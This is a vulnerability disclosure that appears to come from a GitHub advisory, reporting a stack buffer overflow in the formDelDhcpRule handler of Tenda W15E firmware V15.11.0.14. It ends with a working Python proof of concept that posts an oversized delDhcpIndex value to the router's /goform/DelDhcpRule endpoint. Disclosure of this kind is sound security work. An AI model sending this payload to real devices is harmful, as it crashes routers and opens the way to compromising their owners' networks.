## Overview

- Firmware download website: https://www.tendacn.com/download/detail-2722.html

## Affected version

W15EV1.0 V15.11.0.14

## Vulnerability details

The Tenda W15EV1.0 V15.11.0.14 firmware has a stack overflow vulnerability in the `formDelDhcpRule` function. The `indexSet` variable receives the `delDhcpIndex` parameter from a POST request and is directly assigned to `strcpy`. However, since the user can control the input of `delDhcpIndex `, the statement `strcpy((char *)indexs, (const char *)indexSet);` can cause a buffer overflow. The user-provided  `delDhcpIndex` can exceed the capacity of the `indexs` array, triggering this security vulnerability.

![image-20240417101102741](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417101102741.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/DelDhcpRule"
payload = b"a"*2000

data = {
    	'delDhcpIndex':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

![image-20240416114043980](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416114043980.png)
